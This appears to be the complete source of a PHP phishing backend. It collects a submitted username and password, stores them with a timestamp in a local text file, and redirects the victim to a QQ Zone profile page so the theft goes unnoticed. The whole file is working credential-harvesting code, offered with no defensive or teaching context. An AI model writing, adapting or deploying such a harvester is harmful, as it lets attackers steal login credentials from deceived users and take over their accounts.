<?php

date_default_timezone_set("Asia/Shanghai"); 

$date = date('Y-m-d H:m:s');
$user = $_REQUEST['username'];
$passwd= $_REQUEST['pwd'];
$re ="\n" . $date . "::" .$user . "::" . $passwd ;
file_put_contents ('111.txt' ,$re,FILE_APPEND );
header("location:http://user.qzone.qq.com/1912156741/main");
